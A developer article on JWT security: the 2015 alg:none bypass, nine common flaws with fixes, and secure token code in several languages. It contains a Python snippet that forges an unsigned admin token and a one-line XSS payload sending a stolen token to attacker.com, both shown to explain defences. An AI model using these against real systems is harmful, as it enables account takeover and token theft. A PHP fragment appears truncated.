The Auth0 incident that changed how I read JWT documentation

In 2015, Tim McLean, a security researcher, published a disclosure that should have been impossible. He had found a way to authenticate as any user — including administrators — on applications using several popular JWT libraries, without knowing any secret key, without brute-forcing anything, and without any cryptographic attack. The method was almost embarrassingly simple.

He changed the alg field in the JWT header from RS256 to none. Then he removed the signature. Then he changed his user ID in the payload to the admin's user ID. The server accepted the token.

This worked because the JWT libraries at the time — including early versions of Auth0's SDK and several others — were reading the algorithm from the token itself and using it for verification. An attacker who controls the token header also controls which algorithm the server uses to verify it. With alg: none, verification simply doesn't happen.

Auth0 patched the issue. So did most affected libraries. But the underlying lesson remains: JWT is not a black box that is secure by default. It is a format that can be implemented correctly or incorrectly, and the consequences of an incorrect implementation range from complete authentication bypass to silent information leakage. This article covers both extremes.

JWT anatomy: what you're actually sending

A JWT is three Base64url-encoded strings joined by dots. The colors below match the standard way JWT is visualized in documentation and debugging tools.

Header — algorithm + type
Payload — claims (readable by anyone)
Signature — integrity proof

Decoded, the header above contains {"alg":"HS256","typ":"JWT"} and the payload contains {"sub":"user_123","name":"Alice","role":"user","iat":1749376800,"exp":1749463200}. You can decode both right now with a base64url decoder — no secret needed.

This is the most important thing to understand about JWTs, and the one that gets developers into trouble most often: the payload is encoded, not encrypted. Base64url is a reversible encoding, not a security mechanism. Anyone who intercepts or obtains a JWT can read every field in the payload without knowing the secret key. The signature only proves the token was issued by someone who knows the secret. It does not hide the content.

Never put sensitive data in a JWT payload. Passwords, credit card numbers, personal identity numbers, private API keys — none of these belong in a token. If any server, CDN, or log aggregator in your infrastructure stores tokens, that data is exposed.

How the signature works

For HMAC algorithms (HS256, HS384, HS512), the signature is computed as:

HMAC-SHA256(
  secret_key,
  base64url(header) + "." + base64url(payload)
)

For RSA/EC algorithms (RS256, ES256), the server signs with its private key and verifies with its public key. The critical difference: with HMAC, anyone who knows the secret can both create and verify tokens. With RSA, only the holder of the private key can create tokens — the public key can only verify them. This makes RSA algorithms much better suited for distributed systems where multiple services need to verify tokens but should not be able to issue them.

Standard claims reference

RFC 7519 defines a set of registered claim names. None of them are mandatory by the spec, but several are critical for security. If your library doesn't validate exp, iss, and aud by default, configure it explicitly.

9 vulnerabilities — with real attack scenarios

These are the vulnerabilities that appear most often in JWT security audits and CTF challenges. Each one has a real documented history. I've ordered them by severity and included the exact mechanism so you understand why it works, not just that it does.

1. Algorithm "none" — authentication bypass
Critical

Documented in CVE-2015-9235. The attack: change "alg":"HS256" to "alg":"none" in the header, remove the signature, modify any claim in the payload. Vulnerable servers read the algorithm from the token and skip verification entirely.

# Forged token construction (for educational purposes)
import base64, json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "administrator", "exp": 9999999999}

def b64url(data: dict) -> str:
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(',',':')).encode()
    ).rstrip(b'=').decode()

forged = f"{b64url(header)}.{b64url(payload)}."  # Empty signature
print(forged)
Fix

Never read the algorithm from the token. Hardcode the expected algorithm in your verification code. Use a library that requires an explicit algorithms parameter and rejects none.

# Python — PyJWT secure configuration
import jwt

# ❌ Vulnerable: algorithm from token header
decoded = jwt.decode(token, key, algorithms=jwt.get_algorithms_for_key(key))

# ✅ Correct: explicit allowlist, none is never acceptable
decoded = jwt.decode(
    token, key,
    algorithms=["HS256"],  # Only accept exactly this algorithm
    options={"verify_alg": True}
)
2. RS256 → HS256 algorithm confusion
Critical

If a server normally uses RS256 but also accepts HS256, an attacker who has obtained the server's public key (often available at /.well-known/jwks.json) can sign a forged token using that public key as the HMAC secret. The server then verifies it using its own public key — and accepts the token.

The reason this works: an RS256 public key is a long string. If the server's library accepts HS256 tokens and is given the verification "key" for RS256, it might use that public key string as the HMAC secret for HS256 verification. Attacker signs with the same string. Verification passes.

Fix

Maintain a strict algorithm allowlist. Never mix symmetric and asymmetric algorithms on the same endpoint. If you use RS256, only accept RS256.

// Node.js — jsonwebtoken secure configuration
const jwt = require('jsonwebtoken');
const fs  = require('fs');

const PUBLIC_KEY = fs.readFileSync('./keys/public.pem');

// ❌ Vulnerable: accepts both algorithms
const decoded = jwt.verify(token, PUBLIC_KEY);  // No algorithm restriction

// ✅ Correct: explicit asymmetric algorithm only
const decoded = jwt.verify(token, PUBLIC_KEY, {
  algorithms: ['RS256']  // Reject HS256 even if the header requests it
});
3. No expiration claim (exp)
High

A JWT without an exp claim is valid forever. If the token is logged, cached, leaked in a URL, or stored in a database backup — it will still work years later. Token theft becomes a permanent compromise rather than a temporary one.

Fix

Always set exp. 15 minutes for access tokens in security-sensitive applications. Pair with a refresh token for longer sessions. Your library should validate exp by default — verify this in the documentation and test it explicitly.

from datetime import datetime, timedelta, timezone
import jwt, uuid

def create_access_token(user_id: str, secret: str) -> str:
    now = datetime.now(timezone.utc)
    payload = {
        "sub":  user_id,
        "iss":  "https://auth.yourapp.com",
        "aud":  "https://api.yourapp.com",
        "iat":  now,
        "exp":  now + timedelta(minutes=15),  # Short-lived
        "jti":  str(uuid.uuid4()),            # Unique ID for replay prevention
    }
    return jwt.encode(payload, secret, algorithm="HS256")
4. Expiration too long (> 24 hours)
Medium

An access token valid for 24 hours or 30 days gives an attacker a long window of exploitation after theft. A stolen token that expires in 15 minutes becomes useless quickly. One valid for 30 days gives the attacker a month of access to the account — including the ability to change the email, reset the password, and lock out the legitimate user.

Fix

Use short-lived access tokens (15 minutes) paired with a refresh token. The refresh token can be longer-lived (7–30 days) but must be stored in an httpOnly cookie, not accessible to JavaScript.

5. Sensitive data in payload
High

I've seen this in production code from experienced developers: passwords hashed or unhashed, full credit card numbers "because they're hashed anyway," personal identity numbers, internal API keys. The JWT payload is Base64url-encoded — it is not encrypted. Anyone who obtains the token can read every field without any key.

Fix

Store in the payload: user ID, role, session metadata, issued-at timestamp. Never store: passwords (even hashed), financial data, personal identity numbers, private keys, or any data you would not want displayed publicly. If you need to transmit encrypted claims, use JWE (JSON Web Encryption) — a different standard that does provide confidentiality.

# What belongs in a JWT payload
payload_correct = {
    "sub":   "user_abc123",       # Non-guessable user identifier
    "role":  "user",              # Role for authorization
    "email": "alice@example.com", # Only if needed for the token's purpose
    "iat":   1749376800,
    "exp":   1749377700,
}

# What does NOT belong in a JWT payload
payload_wrong = {
    "sub":         "user_abc123",
    "password":    "$2b$12$...",   # ❌ Password hash — never
    "card_number": "4242424242...",# ❌ Financial data — never
    "ssn":         "123-45-6789", # ❌ PII — never
    "api_key":     "sk-live-...", # ❌ Credentials — never
}
6. Missing issuer (iss) and audience (aud) validation
High

In a microservices architecture where several services each issue JWTs, a token issued by Service A for its own users might be accepted by Service B if iss and aud are not validated. An attacker who can obtain a token from a lower-privilege service might replay it against a higher-privilege one.

Fix

Always verify iss against an expected issuer and aud against the current service's identifier. Most JWT libraries accept these as verification parameters.

# Python — verify issuer and audience explicitly
decoded = jwt.decode(
    token,
    SECRET_KEY,
    algorithms=["HS256"],
    audience="https://api.yourapp.com",     # Must match aud claim
    issuer="https://auth.yourapp.com",      # Must match iss claim
    options={"verify_exp": True}
)

// Go — golang-jwt/jwt
claims := jwt.MapClaims{}
token, err := jwt.ParseWithClaims(tokenString, claims, keyFunc,
    jwt.WithAudience("https://api.yourapp.com"),
    jwt.WithIssuer("https://auth.yourapp.com"),
    jwt.WithExpirationRequired(),
)
7. Weak HMAC secret
High

HS256 requires a secret that is at least 256 bits (32 bytes) to achieve its designed security level. Short secrets, dictionary words, or reused secrets from other systems can be brute-forced offline — an attacker who captures a token can attempt signature forgery without ever hitting your server. Common secrets I've seen in real codebases: "secret", "jwt_secret", "password", "1234567890123456".

Fix
# Generate a cryptographically strong HS256 secret
python3 -c "import secrets; print(secrets.token_hex(32))"
# Output: a 64-character hex string (256 bits of entropy)

# Node.js
node -e "require('crypto').randomBytes(32).toString('hex')|0" 
# Or: crypto.randomBytes(32).toString('base64')

# Store in environment variable — never hardcode in source code
SECRET_KEY = os.environ["JWT_SECRET"]  # Not "my_jwt_secret_key"
8. No revocation mechanism (missing jti)
Medium

JWTs are stateless by design — the server doesn't store them, so it can't revoke them. If a user logs out, changes their password, or if you detect a compromised account, the existing tokens remain valid until they expire. For a 15-minute token this is acceptable. For a 24-hour token it means an attacker who stole a token before a password change still has access for up to 24 hours after.

Fix

Use short-lived access tokens to minimize the revocation window. For scenarios requiring immediate revocation, maintain a server-side blocklist of jti values. A Redis SET with the token's expiry TTL is the most common implementation.

# Redis-based JWT blocklist
import redis
r = redis.Redis()

def revoke_token(jti: str, exp: int) -> None:
    """Add token ID to blocklist until it expires."""
    ttl = exp - int(time.time())
    if ttl > 0:
        r.setex(f"revoked:{jti}", ttl, "1")

def is_token_revoked(jti: str) -> bool:
    return r.exists(f"revoked:{jti}") > 0

# In your middleware
decoded = jwt.decode(token, key, algorithms=["HS256"], ...)
if is_token_revoked(decoded.get("jti")):
    raise AuthenticationError("Token has been revoked")
9. Token stored in localStorage (XSS exposure)
High

localStorage is accessible to any JavaScript running on your page — including scripts injected via XSS, compromised third-party libraries, and browser extensions. A single XSS vulnerability anywhere on your site becomes a full token theft. The attack is simple:

// XSS payload: one line to steal all stored tokens
fetch('https://attacker.com/steal?t=' + localStorage.getItem('access_token'))
Fix

Keep access tokens in memory (a JavaScript variable). Use an httpOnly, Secure, SameSite=Strict cookie for the refresh token. httpOnly cookies are invisible to JavaScript — XSS cannot read them. See the storage comparison table below for the full analysis.

Secure implementation in 5 languages

Each snippet shows the full secure pattern: token creation with all recommended claims, token verification with explicit algorithm and audience, and error handling. These are starting points — adapt the secret management to your infrastructure (environment variables, AWS Secrets Manager, HashiCorp Vault).

# pip install PyJWT cryptography
import jwt, uuid, os
from datetime import datetime, timedelta, timezone

SECRET_KEY = os.environ["JWT_SECRET"]  # Min 256 bits (32 bytes)
ISSUER     = "https://auth.yourapp.com"
AUDIENCE   = "https://api.yourapp.com"

# ── Create access token ───────────────────────────────────────
def create_access_token(user_id: str, role: str = "user") -> str:
    now = datetime.now(timezone.utc)
    return jwt.encode({
        "sub": user_id,
        "role": role,
        "iss": ISSUER,
        "aud": AUDIENCE,
        "iat": now,
        "exp": now + timedelta(minutes=15),
        "jti": str(uuid.uuid4()),  # Unique ID for revocation
    }, SECRET_KEY, algorithm="HS256")

# ── Create refresh token (longer-lived, minimal claims) ───────
def create_refresh_token(user_id: str, session_id: str) -> str:
    now = datetime.now(timezone.utc)
    return jwt.encode({
        "sub": user_id,
        "session_id": session_id,  # Links to server-side session
        "iss": ISSUER,
        "aud": AUDIENCE,
        "iat": now,
        "exp": now + timedelta(days=7),
        "jti": str(uuid.uuid4()),
    }, SECRET_KEY, algorithm="HS256")

# ── Verify token ──────────────────────────────────────────────
def verify_token(token: str) -> dict:
    try:
        return jwt.decode(
            token, SECRET_KEY,
            algorithms=["HS256"],          # Explicit allowlist — never ["HS256", "none"]
            audience=AUDIENCE,             # Validate audience
            issuer=ISSUER,                 # Validate issuer
            options={
                "verify_exp": True,        # Always check expiry
                "verify_iss": True,
                "verify_aud": True,
                "require": ["sub", "exp", "iat", "jti"]  # Required claims
            }
        )
    except jwt.ExpiredSignatureError:
        raise AuthenticationError("Token has expired")
    except jwt.InvalidTokenError as e:
        raise AuthenticationError(f"Invalid token: {e}")

// ── Verify token ──────────────────────────────────────────────
function verifyToken(token) {
  try {
    return jwt.verify(token, SECRET_KEY, {
      algorithms: ['HS256'],  // Never accept RS256 here (confusion attack)
      issuer:     ISSUER,
      audience:   AUDIENCE,
      clockTolerance: 30,     // 30-second clock skew tolerance
    });
  } catch (err) {
    if (err.name === 'TokenExpiredError') throw new Error('Token expired');
    if (err.name === 'JsonWebTokenError') throw new Error(`Invalid token: ${err.message}`);
    throw err;
  }
}

// ── Express.js middleware ─────────────────────────────────────
function authenticate(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Missing Authorization header' });
  }
  const token = authHeader.slice(7);
  try {
    req.user = verifyToken(token);
    next();
  } catch (err) {
    res.status(401).json({ error: err.message });
  }
}
// go get github.com/golang-jwt/jwt/v5
package auth

import (
    "errors"
    "os"
    "time"

    "github.com/golang-jwt/jwt/v5"
    "github.com/google/uuid"
)

var (
    secretKey = []byte(os.Getenv("JWT_SECRET"))
    issuer    = "https://auth.yourapp.com"
    audience  = "https://api.yourapp.com"
)

type Claims struct {
    Role string `json:"role"`
    jwt.RegisteredClaims
}

// CreateAccessToken creates a short-lived access token
func CreateAccessToken(userID, role string) (string, error) {
    now := time.Now()
    claims := Claims{
        Role: role,
        RegisteredClaims: jwt.RegisteredClaims{
            Subject:   userID,
            Issuer:    issuer,
            Audience:  jwt.ClaimStrings{audience},
            IssuedAt:  jwt.NewNumericDate(now),
            ExpiresAt: jwt.NewNumericDate(now.Add(15 * time.Minute)),
            ID:        uuid.New().String(), // jti
        },
    }
    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
    return token.SignedString(secretKey)
}

// VerifyToken parses and validates a JWT token
func VerifyToken(tokenString string) (*Claims, error) {
    token, err := jwt.ParseWithClaims(
        tokenString,
        &Claims{},
        func(token *jwt.Token) (interface{}, error) {
            // Verify the signing method — prevent algorithm confusion
            if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
                return nil, errors.New("unexpected signing method")
            }
            return secretKey, nil
        },
        jwt.WithAudience(audience),
        jwt.WithIssuer(issuer),
        jwt.WithExpirationRequired(),
        jwt.WithIssuedAt(),
    )
    if err != nil {
        return nil, err
    }
    claims, ok := token.Claims.(*Claims)
    if !ok {
        return nil, errors.New("invalid claims")
    }
    return claims, nil
}
// Maven: io.jsonwebtoken:jjwt-api:0.12.6 + jjwt-impl + jjwt-jackson
import io.jsonwebtoken.*;
import io.jsonwebtoken.security.Keys;
import javax.crypto.SecretKey;
import java.time.*;
import java.util.UUID;

public class JwtService {
    private final SecretKey key;
    private final String issuer   = "https://auth.yourapp.com";
    private final String audience = "https://api.yourapp.com";

    public JwtService() {
        // Load from environment — minimum 256 bits for HS256
        String secret = System.getenv("JWT_SECRET");
        this.key = Keys.hmacShaKeyFor(secret.getBytes());
    }

    // ── Create access token ───────────────────────────────────
    public String createAccessToken(String userId, String role) {
        Instant now = Instant.now();
        return Jwts.builder()
            .subject(userId)
            .claim("role", role)
            .issuer(issuer)
            .audience().add(audience).and()
            .issuedAt(Date.from(now))
            .expiration(Date.from(now.plus(15, ChronoUnit.MINUTES)))
            .id(UUID.randomUUID().toString())   // jti
            .signWith(key, Jwts.SIG.HS256)      // Explicit algorithm
            .compact();
    }

    // ── Verify token ──────────────────────────────────────────
    public Claims verifyToken(String token) {
        try {
            return Jwts.parser()
                .verifyWith(key)
                .requireIssuer(issuer)
                .requireAudience(audience)
                .build()
                .parseSignedClaims(token)
                .getPayload();
        } catch (ExpiredJwtException e) {
            throw new AuthenticationException("Token expired");
        } catch (JwtException e) {
            throw new AuthenticationException("Invalid token: " + e.getMessage());
        }
    }
}

            throw new AuthenticationException('Token has expired');
        } catch (SignatureInvalidException $e) {
            throw new AuthenticationException('Invalid signature');
        } catch (\Exception $e) {
            throw new AuthenticationException('Invalid token: ' . $e->getMessage());
        }
    }
}

The correct access + refresh token pattern

The security goal is to keep the access token short-lived enough that theft doesn't matter much, while still giving users a session that doesn't require re-authentication every 15 minutes. The solution that the industry has converged on — used by Google, GitHub, and Stripe — is the access + refresh token pair with rotation.

User →→ POST /auth/login {username, password}
Server →→ access_token (15 min, in response body) + refresh_token (7 days, httpOnly cookie)
# Client stores access_token in memory (JS variable), never in localStorage
User →→ GET /api/data Authorization: Bearer <access_token>
Server →→ 200 OK {data}
# access_token expires after 15 min
User →→ POST /auth/refresh (refresh_token sent automatically via httpOnly cookie)
Server →→ new access_token (15 min) + NEW refresh_token (invalidates old one) ← ROTATION
# Old refresh_token is immediately invalidated in the database
User →→ POST /auth/logout
Server →→ Invalidates refresh_token in DB + clears cookie + adds access jti to blocklist

The rotation step is what makes theft detectable. When a legitimate user tries to use their refresh token after an attacker has already used it (because rotation issued a new one to the attacker), the legitimate user's token is already invalidated. The server detects a replay attempt on a revoked refresh token and can immediately invalidate the entire session family.

# Server-side refresh token rotation (Python + Redis)
import redis, secrets
r = redis.Redis()

def rotate_refresh_token(old_refresh_token: str, user_id: str) -> dict:
    """
    Validate old refresh token, issue new one, invalidate old one.
    If the old token is already revoked, possible token theft detected.
    """
    token_key = f"refresh:{user_id}:{old_refresh_token}"

    # Check if token exists and is valid
    if not r.exists(token_key):
        # Old token already used or revoked — possible token theft
        # Invalidate ALL refresh tokens for this user as a safety measure
        r.delete(*r.keys(f"refresh:{user_id}:*"))
        raise SecurityError("Refresh token reuse detected — session invalidated")

    # Revoke the old token immediately
    r.delete(token_key)

    # Issue new refresh token
    new_token = secrets.token_urlsafe(32)
    r.setex(f"refresh:{user_id}:{new_token}", 604800, "valid")  # 7 days TTL

    return {
        "access_token":  create_access_token(user_id),
        "refresh_token": new_token  # Send in httpOnly cookie
    }

The * next to CSRF resistance for httpOnly cookies: CSRF attacks work by tricking a browser into sending a request with the victim's cookies attached. Mitigate this with SameSite=Strict (or Lax) and a CSRF token in a custom header. The combination of httpOnly; Secure; SameSite=Strict provides good protection against both XSS and CSRF for the refresh token.

# Setting the refresh token cookie correctly (Python/Flask example)
from flask import make_response

response = make_response({"access_token": access_token})
response.set_cookie(
    "refresh_token",
    value=refresh_token,
    httponly=True,       # Not accessible to JavaScript
    secure=True,         # HTTPS only
    samesite="Strict",   # Not sent on cross-site requests (CSRF mitigation)
    max_age=604800,      # 7 days
    path="/auth/refresh" # Only sent to the refresh endpoint, not everywhere
)
return response

Frequently asked questions

What is the algorithm "none" vulnerability in JWT?

When a JWT specifies alg: none in its header, it carries no signature at all. Vulnerable servers that read the algorithm from the token and trust it skip verification entirely. An attacker can forge a token with any claims — including admin: true or any user ID — by simply base64url-encoding their header and payload without signing anything. The fix is to never read the algorithm from the token and to maintain an explicit allowlist in your verification code, such as algorithms=["HS256"].

What is the RS256/HS256 algorithm confusion attack?

If a server normally verifies tokens with RS256 but also accepts HS256, an attacker who has obtained the server's public key can sign a forged token using that public key as the HMAC secret for HS256. The server verifies it using its own public key — and accepts it, because the HMAC verification of "public key as secret" passes when the same key was used to sign. The fix: specify a strict algorithm allowlist in your JWT library. If your server uses RS256, it must reject HS256 tokens unconditionally.

Should I store JWT tokens in localStorage or cookies?

Never store JWT tokens in localStorage or sessionStorage. Both are fully readable by any JavaScript running on your page, including XSS payloads and compromised third-party scripts. For access tokens, use a JavaScript variable in memory — wiped on page reload. For refresh tokens, use an httpOnly, Secure, SameSite=Strict cookie, which is invisible to JavaScript. Add a CSRF token in a custom header to protect against CSRF attacks on the refresh endpoint.

What is refresh token rotation?

Refresh token rotation means issuing a brand new refresh token every time an access token is refreshed, and immediately invalidating the old one. The key security benefit is detection of token theft: if an attacker steals a refresh token and uses it, the server issues a new one to the attacker and invalidates the old one. When the legitimate user tries to use their (now revoked) token, the server detects a reuse attempt on an invalidated token and can invalidate the entire session family. Without rotation, a stolen refresh token can be used indefinitely alongside the legitimate user.

Why should I never put sensitive data in a JWT payload?

JWT payloads are Base64url-encoded, not encrypted. Base64url is a completely reversible transformation — anyone who has the token can decode every field without knowing any secret key. This includes servers, CDNs, log aggregators, browser extensions, and anyone who intercepts network traffic over HTTP. If you need to transmit encrypted claims, use JWE (JSON Web Encryption) — a distinct standard (RFC 7516) that provides confidentiality.

What is a good expiration time for a JWT access token?

15 minutes is the most common recommendation for security-sensitive applications. This limits the window of exploitation if a token is stolen — an attacker who captures a 15-minute token has at most 15 minutes of access. Pair this with a 7-day refresh token stored in an httpOnly cookie. For lower-risk applications (public content, non-sensitive data), 1 hour is acceptable. For high-security contexts (banking, healthcare), consider 5 minutes or even shorter with frequent silent refresh.
